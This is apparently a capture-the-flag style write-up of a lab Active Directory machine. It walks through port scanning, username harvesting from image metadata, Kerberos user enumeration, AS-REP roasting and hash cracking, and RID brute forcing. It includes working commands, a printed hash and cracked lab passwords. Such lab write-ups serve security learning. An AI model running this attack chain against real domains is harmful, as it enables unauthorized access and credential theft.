# Host file setup
```python
sudo nxc smb 10.129.232.60 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.absolute.htb                                                           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 15:26 +0100
Nmap scan report for dc.absolute.htb (10.129.232.60)
Host is up (0.012s latency).
rDNS record for 10.129.232.60: DC.absolute.htb
Not shown: 65509 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49677/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49695/tcp open  unknown
49712/tcp open  unknown
49715/tcp open  unknown
51753/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc.absolute.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 15:28 +0100
Nmap scan report for dc.absolute.htb (10.129.232.60)
Host is up (0.013s latency).
rDNS record for 10.129.232.60: DC.absolute.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Absolute
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-16 21:28:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-08-16T21:29:40+00:00; +6h59m55s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-16T21:29:40+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-08-16T21:29:40+00:00; +6h59m55s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-08-16T21:29:40+00:00; +6h59m55s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|11|2022|2012|2016 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows Server 2016 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth is enabled by default on all DCs, but i cannot do anything with it here

Guest account is also disabled!

# HTTP (80)

Nuclei did not find anything

No vhosts

```python
exiftool hero_1.jpg 
ExifTool Version Number         : 13.55
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 20:45:20+01:00
File Access Date/Time           : 2026:08:16 15:51:10+01:00
File Inode Change Date/Time     : 2026:08:16 15:51:10+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
```

Feroxbuster found some images and after using wget to download one of them, i see a username in the metadata. I might be able to use this to get some valid usernames

Using the same naming convention for the image i found 6 images with 6 different names!

```python
cat names.txt               
james roberts
michael chaffrey
donald klay
sarah osvald
jeffer robinson
nicole smith
```

Ill run these through username anarchy to create a possible user list

```python
./username-anarchy -i ../names.txt | tee ../possible-users.txt
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
rjames
r.james
robertsj
roberts
roberts.j
roberts.james
jr
michael
michaelchaffrey
michael.chaffrey
michaelc
michchaf
m.chaffrey
mchaffrey
cmichael
c.michael
chaffreym
chaffrey
chaffrey.m
chaffrey.michael
mc
donald
donaldklay
donald.klay
donaldkl
donaklay
donaldk
d.klay
dklay
kdonald
k.donald
klayd
klay
klay.d
klay.donald
dk
sarah
sarahosvald
sarah.osvald
sarahosv
saraosva
saraho
s.osvald
sosvald
osarah
o.sarah
osvalds
osvald
osvald.s
osvald.sarah
so
jeffer
jefferrobinson
jeffer.robinson
jefferro
jeffrobi
jefferr
j.robinson
jrobinson
rjeffer
r.jeffer
robinsonj
robinson
robinson.j
robinson.jeffer
nicole
nicolesmith
nicole.smith
nicolesm
nicosmit
nicoles
n.smith
nsmith
snicole
s.nicole
smithn
smith
smith.n
smith.nicole
ns
```

So ive cloned the GH repo, then ran it against the names file then saved the output to another file which i can now run against kerbrute with userenum

```python
kerbrute userenum --dc dc.absolute.htb -d absolute.htb possible-users.txt                                             

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/16/26 - Ronnie Flathers @ropnop

2026/08/16 16:00:32 >  Using KDC(s):
2026/08/16 16:00:32 >  	dc.absolute.htb:88

2026/08/16 16:00:32 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2026/08/16 16:00:32 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2026/08/16 16:00:32 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2026/08/16 16:00:32 >  [+] VALID USERNAME:	d.klay@absolute.htb
2026/08/16 16:00:32 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2026/08/16 16:00:32 >  [+] VALID USERNAME:	n.smith@absolute.htb
2026/08/16 16:00:32 >  Done! Tested 88 usernames (6 valid) in 0.127 seconds
```

I have found 6 valid users!

Ill place these into a userlist!

# AS-REP roasting leads to user compromise

```python
nxc ldap dc.absolute.htb -u users.txt -p '' --asreproast asrep.hash
LDAP        10.129.232.60   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.60   389    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:62accb3e3c118998ea1c498dfbe829d9$3756dba6189243faa0fa53856856a70700619d67ffa6b9b5b47bcf1f7f482ecf1f94582e25e282e416b439856344af99f65965078db02d9e7f7a85c5d64d0915fdf25489fc37e6b421e59fae0e2f99efd84eca5fb40a054f3aa4f4dc5d3a9dbe35364834647483c242d3251213cc7ad88f8ab332767080f5227d0cb40c04bbe00ee345f9fcfcda0ee7eb8582eccbf39e51ba63ab7ea193e6ad8958d0f4d14ddfe81a066239727abee6ee77aa8e6023a9b6044fc3361595bd20bbf892d207aa7d1b4900adec7b001d3a6c497eb41b0c17fe83511a04a80930bf763fc45b4ca31b848c68f19c7bcf6a27d26861
```

Its also an E type 23 hash, which indicates RC4 algorithm, which means its likely to crack

```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$d.klay@ABSOLUTE.HTB:62accb3e3c118998ea1c498dfbe829d9$3756dba6189243faa0fa53856856a70700619d67ffa6b9b5b47bcf1f7f482ecf1f94582e25e282e416b439856344af99f65965078db02d9e7f7a85c5d64d0915fdf25489fc37e6b421e59fae0e2f99efd84eca5fb40a054f3aa4f4dc5d3a9dbe35364834647483c242d3251213cc7ad88f8ab332767080f5227d0cb40c04bbe00ee345f9fcfcda0ee7eb8582eccbf39e51ba63ab7ea193e6ad8958d0f4d14ddfe81a066239727abee6ee77aa8e6023a9b6044fc3361595bd20bbf892d207aa7d1b4900adec7b001d3a6c497eb41b0c17fe83511a04a80930bf763fc45b4ca31b848c68f19c7bcf6a27d26861:Darkmoonsky248girl
```

The hash cracked

```python
nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl'          
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
```

there is a restriction on the user, this could be because the user is protected users

```python
ntpdate dc.absolute.htb                                     
2026-08-16 23:08:44.097863 (+0100) +25195.459747 +/- 0.006589 dc.absolute.htb 10.129.232.60 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

Ill read the time of the domain controller

```python
faketime '23:08:44.097863' nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
```

Then ill sync with it, then us kerberos auth to bypass the restriction

Alternatively, i could use `faketime -f +7h` to save having to keep changing the time!

# Enumeration as `k.clay`

```python
faketime -f +7h nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         dc.absolute.htb 445    DC               [*] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share 
SMB         dc.absolute.htb 445    DC               Shared                          
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

Read access on default shares

```python
faketime -f +7h nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
J.Roberts
M.Chaffrey
D.Klay
s.osvald
j.robinson
n.smith
m.lovegod
l.moore
c.colt
s.johnson
d.lemm
svc_smb
svc_audit
winrm_user
```

Now using my credentials, i can dump the full user list

There are also no kerberoatable users

# Compromising `svc_smb`

```python
faketime -f +7h nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k --users             
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         dc.absolute.htb 445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.absolute.htb 445    DC               Administrator                 2022-06-09 08:25:57 0       Built-in account for administering the computer/domain 
SMB         dc.absolute.htb 445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.absolute.htb 445    DC               krbtgt                        2022-06-09 08:16:38 0       Key Distribution Center Service Account 
SMB         dc.absolute.htb 445    DC               J.Roberts                     2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               M.Chaffrey                    2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               D.Klay                        2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               s.osvald                      2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               j.robinson                    2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               n.smith                       2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               m.lovegod                     2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               l.moore                       2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               c.colt                        2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               s.johnson                     2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               d.lemm                        2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               svc_smb                       2022-06-09 08:25:51 0       AbsoluteSMBService123! 
SMB         dc.absolute.htb 445    DC               svc_audit                     2022-06-09 08:25:51 0        
SMB         dc.absolute.htb 445    DC               winrm_user                    2022-06-09 08:25:51 0       Used to perform simple network tasks 
```

I chose to use the `--user` flag in SMB simply to display user account descriptions!

And i have found a password

```python
faketime -f +7h nxc smb dc.absolute.htb -u svc_smb -p 'AbsoluteSMBService123!' -k       
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
```

This user is now compromised

```python
faketime -f +7h nxc smb dc.absolute.htb -u svc_smb -p 'AbsoluteSMBService123!' -k --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         dc.absolute.htb 445    DC               [*] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share 
SMB         dc.absolute.htb 445    DC               Shared          READ            
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

This user has read access on the `Shared` SMB share



